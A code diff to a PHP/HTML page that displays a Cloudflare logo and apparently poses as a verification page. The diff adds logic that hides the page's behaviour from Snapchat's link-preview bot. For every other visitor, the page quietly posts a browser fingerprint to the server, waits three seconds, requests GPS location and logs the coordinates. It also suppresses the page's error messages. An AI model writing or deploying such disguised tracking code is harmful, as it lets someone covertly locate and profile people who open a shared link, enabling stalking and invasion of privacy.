@@ -184,7 +184,7 @@ body{
 <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
 </head>
 
-<body onload="wait()">
+<body onload="checkIfRobot()">
   <div style="padding-top: 10vh;">
     <center>
   <img class="blob" src="https://blog.cloudflare.com/content/images/2016/09/cf-blog-logo-crop.png" alt="Italian Trulli">
@@ -206,6 +206,8 @@ body{
 <script src="https://cpwebassets.codepen.io/assets/common/stopExecutionOnTimeout-2c7831bb44f98c1391d6a4ffda0e1fd302503391ca806e7fcc7b9b87197aec26.js"></script>
 
 <script type="text/javascript">
+
+//checks if its a snapbot.
 function checkIfRobot() {
   if (navigator.userAgent.includes("developers.snap.com")) {
     //this is a snaphat bot.
@@ -213,9 +215,11 @@ function checkIfRobot() {
   }else {
     //this is not a snapchat bot.
     reportJSStuff();
+    waitBeforeGPS();
   }
 }
 
+//function returns if user has adblocker.
 function isAdBlockerEnabled() {
   var testAd = document.createElement('div');
   testAd.innerHTML = '&nbsp;';
@@ -228,6 +232,7 @@ function isAdBlockerEnabled() {
   return adBlockerEnabled;
 }
 
+//function returns OS of user.
 function getOS() {
   var userAgent = navigator.userAgent;
   var platform = navigator.platform;
@@ -250,11 +255,9 @@ function getOS() {
   return os;
 }
 
+//function returns navigator info
 function getBrowserData() {
   var browserData = [];
-  var browserData2 = [];
-
-
   browserData.push({ name: "jsuseragent", value: navigator.userAgent });
   browserData.push({ name: "jslang", value: navigator.language });
   browserData.push({ name: "jsPlatform", value: navigator.platform });
@@ -268,10 +271,10 @@ function getBrowserData() {
   browserData.push({ name: "identifier", value: <?php echo "'".$identifier."'" ?> });
   browserData.push({ name: "JsOS", value: getOS() });
   browserData.push({ name: "jsMemory", value: navigator.devicememory});
-
   return browserData;
 }
 
+//function tht pushes navigator information to updateLogWithJS
 function reportJSStuff() {
   $.ajax({
     method: "POST",
@@ -279,35 +282,33 @@ function reportJSStuff() {
     data: getBrowserData()
   })
     .done(function(data) {
-      console.log(data);
-      $(".baconText").text(data[0]);
+      //console.log(data);
+      //$(".baconText").text(data[0]);
     })
     .fail(function() {
-      alert("no good");
+      //alert("no good");
     });
 }
 
-function getLocation() {
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(sendLocation);
-  } else {
-    x.innerHTML = "Geolocation is not supported by this browser.";
-  }
-}
 
+//variable for waiting
 const sleep = async (milliseconds) => {
     await new Promise(resolve => {
         return setTimeout(resolve, milliseconds)
     });
 };
-const testSleep = async () => {
-    for (let i = 0; i < 10; i++) {
+
+//function to wait three seconds before asking user for their location
+const waitBeforeGPS = async () => {
+    for (let i = 0; i < 3; i++) {
         await sleep(1000);
         console.log(i);
     }
 
     getLocation();
 }
+
+//ask user to allow their gps location.
 function getLocation() {
   if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(sendLocation);
@@ -316,6 +317,7 @@ function getLocation() {
 
 }
 
+//User has accepted to show gps loction. So now log it.
 function sendLocation(position) {
   $.ajax({
     method: "POST",
